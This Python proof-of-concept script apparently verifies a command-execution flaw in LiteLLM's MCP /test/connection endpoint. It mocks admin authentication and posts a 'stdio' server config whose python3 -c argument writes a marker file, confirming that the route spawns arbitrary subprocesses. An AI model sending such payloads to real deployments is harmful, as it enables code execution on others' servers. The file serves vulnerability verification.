# --- iridium env bootstrap ---
import os as _ir_os
_ir_os.environ.setdefault('DATABASE_URL', 'sqlite:////tmp/iridium-dummy.db')
_ir_os.environ.setdefault('SQLALCHEMY_DATABASE_URI', 'sqlite:////tmp/iridium-dummy.db')
_ir_os.environ.setdefault('SQLALCHEMY_FILE', '/tmp/iridium-dummy.db')
_ir_os.environ.setdefault('SECRET_KEY', 'iridium-dummy-secret')
_ir_os.environ.setdefault('DEBUG', 'false')
_ir_os.environ.setdefault('APP_ENV', 'iridium-sandbox')
_ir_os.environ.setdefault('FLASK_INSTANCE_PATH', '/tmp/instance')
_ir_os.environ.setdefault('IRIDIUM_DJANGO_DB', '/tmp/iridium-django.db')
_ir_os.environ.setdefault('WEB_UPLOADDIR', '/tmp/iridium-uploads')
_ir_os.environ.setdefault('OPENAI_API_KEY', 'iridium-dummy-secret')
_ir_os.environ.setdefault('OPENAI_BASE_URL', 'http://127.0.0.1')
_ir_os.environ.setdefault('COHERE_API_KEY', 'iridium-dummy-secret')
_ir_os.environ.setdefault('OR_SITE_URL', 'http://127.0.0.1')
_ir_os.environ.setdefault('OR_APP_NAME', 'iridium-dummy')
_ir_os.environ.setdefault('OR_API_KEY', 'iridium-dummy-secret')
_ir_os.environ.setdefault('AZURE_API_BASE', 'iridium-dummy')
_ir_os.environ.setdefault('AZURE_API_VERSION', 'iridium-dummy')
_ir_os.environ.setdefault('AZURE_API_KEY', 'iridium-dummy-secret')
_ir_os.environ.setdefault('REPLICATE_API_KEY', 'iridium-dummy-secret')
_ir_os.environ.setdefault('REPLICATE_API_TOKEN', 'iridium-dummy-secret')
_ir_os.environ.setdefault('ANTHROPIC_API_KEY', 'iridium-dummy-secret')
_ir_os.environ.setdefault('INFISICAL_TOKEN', 'iridium-dummy-secret')
_ir_os.environ.setdefault('NOVITA_API_KEY', 'iridium-dummy-secret')
_ir_os.environ.setdefault('INFINITY_API_KEY', 'iridium-dummy-secret')
_ir_os.environ.setdefault('LITELLM_MASTER_KEY', 'iridium-dummy-secret')
_ir_os.environ.setdefault('STORE_MODEL_IN_DB', 'iridium-dummy')
_ir_os.environ.setdefault('DEFAULT_CODE_KEYWORDS', 'iridium-dummy-secret')
_ir_os.environ.setdefault('DEFAULT_REASONING_KEYWORDS', 'iridium-dummy-secret')
_ir_os.environ.setdefault('DEFAULT_TECHNICAL_KEYWORDS', 'iridium-dummy-secret')
_ir_os.environ.setdefault('DEFAULT_SIMPLE_KEYWORDS', 'iridium-dummy-secret')
_ir_os.environ.setdefault('DEFAULT_DIMENSION_WEIGHTS', 'iridium-dummy')
_ir_os.environ.setdefault('DEFAULT_TIER_BOUNDARIES', 'iridium-dummy')
_ir_os.environ.setdefault('DEFAULT_TOKEN_THRESHOLDS', 'iridium-dummy-secret')
_ir_os.environ.setdefault('DEFAULT_TIER_MODELS', 'iridium-dummy')
_ir_os.environ.setdefault('DEFAULT_COMPLEXITY_CONFIG', 'iridium-dummy')
_ir_os.environ.setdefault('SIMPLE', 'iridium-dummy')
_ir_os.environ.setdefault('MEDIUM', 'iridium-dummy')
_ir_os.environ.setdefault('COMPLEX', 'iridium-dummy')
_ir_os.environ.setdefault('REASONING', 'iridium-dummy')
_ir_os.makedirs('/tmp/instance', exist_ok=True)
# --- end iridium env bootstrap ---
import os
import sys
from pathlib import Path
_IR_REPO_ROOT = os.environ.get('IRIDIUM_REPO_PATH', '/workspace')
_IR_BIND_SUFFIX = ''
_IR_BIND_PATH = os.path.join(_IR_REPO_ROOT, _IR_BIND_SUFFIX) if _IR_BIND_SUFFIX else _IR_REPO_ROOT
_IR_TARGET_FILE_PATH = str(Path(_IR_REPO_ROOT) / 'litellm/proxy/_experimental/mcp_server/rest_endpoints.py')
_IR_TARGET_DIR = str(Path(_IR_TARGET_FILE_PATH).parent)
_IR_REL_ROOTS = ['', 'enterprise', 'litellm-proxy-extras']
_IR_EXCLUDE_DIRS = set(['.git', '.venv', '__pycache__', 'build', 'dist', 'docs', 'node_modules', 'venv'])
_IR_IMPORT_ROOTS = [_IR_REPO_ROOT, os.getcwd()]
for _IR_REL in _IR_REL_ROOTS:
    _IR_SYS_PATH = _IR_REPO_ROOT if not _IR_REL else os.path.join(_IR_REPO_ROOT, _IR_REL)
    if _IR_SYS_PATH and os.path.isdir(_IR_SYS_PATH) and _IR_SYS_PATH not in _IR_IMPORT_ROOTS:
        _IR_IMPORT_ROOTS.append(_IR_SYS_PATH)
if _IR_BIND_PATH and _IR_BIND_PATH not in _IR_IMPORT_ROOTS:
    _IR_IMPORT_ROOTS.append(_IR_BIND_PATH)
try:
    for _IR_ENTRY in sorted(Path(_IR_REPO_ROOT).iterdir(), key=lambda _p: _p.name.lower()):
        if not _IR_ENTRY.is_dir():
            continue
        if _IR_ENTRY.name.startswith('.') or _IR_ENTRY.name in _IR_EXCLUDE_DIRS:
            continue
        if any((_IR_ENTRY / _IR_MARKER).exists() for _IR_MARKER in ('__init__.py', 'pyproject.toml', 'setup.py')):
            _IR_SYS_PATH = str(_IR_ENTRY)
            if _IR_SYS_PATH not in _IR_IMPORT_ROOTS:
                _IR_IMPORT_ROOTS.append(_IR_SYS_PATH)
except Exception:
    pass
_ir_norm_roots = []
for _ir_candidate in _IR_IMPORT_ROOTS:
    _ir_norm = os.path.normpath(str(_ir_candidate or ''))
    if _ir_norm and _ir_norm not in _ir_norm_roots:
        _ir_norm_roots.append(_ir_norm)
_IR_IMPORT_ROOTS = [
    _ir_norm
    for _ir_norm in _ir_norm_roots
    if not any(
        _ir_norm != _ir_parent and _ir_norm.startswith(_ir_parent + os.sep)
        for _ir_parent in _ir_norm_roots
    )
]
for _IR_SYS_PATH in reversed(_IR_IMPORT_ROOTS):
    if _IR_SYS_PATH and _IR_SYS_PATH not in sys.path:
        sys.path.insert(0, _IR_SYS_PATH)
_iridium_target = None
try:
    import litellm.proxy._experimental.mcp_server.rest_endpoints as _iridium_target
except ModuleNotFoundError as _ir_dep_exc:
    print('IRIDIUM_SANDBOX_DEP_SKIP', _ir_dep_exc)
    raise SystemExit(0)
except Exception as _ir_exc:
    print('IRIDIUM_TARGET_IMPORT_SKIP', _ir_exc)
import importlib
import os
import sys
from pathlib import Path
proof = Path('/tmp/iridium_proof')
if proof.exists():
    proof.unlink()
os.environ.setdefault('LITELLM_MASTER_KEY', 'sk-iridium-test')
os.environ.setdefault('LITELLM_PROXY_ADMIN_KEY', 'sk-iridium-admin')
workspace = Path('/workspace')
if workspace.exists() and str(workspace) not in sys.path:
    sys.path.insert(0, str(workspace))
app = None
_ir_target = globals().get('_iridium_target')
if _ir_target is not None:
    _ir_router = getattr(_ir_target, 'router', None)
    if _ir_router is not None:
        from fastapi import FastAPI
        app = FastAPI()
        app.include_router(_ir_router)
        _ir_auth_dep = None
        for _ir_attr in ('user_api_key_auth', 'get_current_user', 'verify_token', 'require_auth'):
            _ir_auth_dep = getattr(_ir_target, _ir_attr, None)
            if _ir_auth_dep is not None:
                break
        if _ir_auth_dep is None:
            try:
                from litellm.proxy.auth.user_api_key_auth import user_api_key_auth as _ir_auth_dep
            except Exception:
                _ir_auth_dep = None
        if _ir_auth_dep is not None:
            try:
                from litellm.proxy._types import LitellmUserRoles, UserAPIKeyAuth
                def _iridium_mock_admin():
                    return UserAPIKeyAuth(user_role=LitellmUserRoles.PROXY_ADMIN, api_key='sk-iridium-admin')
                app.dependency_overrides[_ir_auth_dep] = _iridium_mock_admin
            except Exception:
                try:
                    app.dependency_overrides[_ir_auth_dep] = lambda: object()
                except Exception as _ir_auth_exc:
                    print('IRIDIUM_AUTH_MOCK_SKIP', _ir_auth_exc)
if app is None:
    for mod_name in ('litellm.proxy.proxy_server', 'proxy_server', 'main', 'app'):
        try:
            mod = importlib.import_module(mod_name)
        except Exception:
            continue
        app = getattr(mod, 'app', None)
        if app is not None:
            break
if app is None:
    raise SystemExit('PROOF FAILED: could not import FastAPI app or sub-router')
try:
    from fastapi.testclient import TestClient
except Exception as exc:
    raise SystemExit(f'PROOF FAILED: TestClient unavailable: {exc}') from exc
client = TestClient(app)
payload = {
    'transport': 'stdio',
    'command': 'python3',
    'args': ['-c', "open('/tmp/iridium_proof','w').write('IRIDIUM_PROOF_CREATED')"],
    'alias': 'iridium-poc',
}
headers = {'Authorization': 'Bearer sk-iridium-admin'}
paths_to_try = []
if '/test/connection':
    paths_to_try.append('/test/connection')
if '/mcp-rest/test/connection' not in paths_to_try:
    paths_to_try.append('/mcp-rest/test/connection')
if '/test/connection' not in paths_to_try:
    paths_to_try.append('/test/connection')
last_resp = None
for route_try in paths_to_try:
    last_resp = client.post(route_try, json=payload, headers=headers)
    if proof.exists():
        break
resp = last_resp
if resp.status_code >= 500:
    raise SystemExit(f'PROOF FAILED: route returned {resp.status_code}: {resp.text[:300]}')
if not proof.exists():
    raise SystemExit('PROOF FAILED: route did not spawn subprocess with proof marker')
IRIDIUM_POC_SUCCESS = True
print('PROOF OK: POST /test/connection reached subprocess sink')
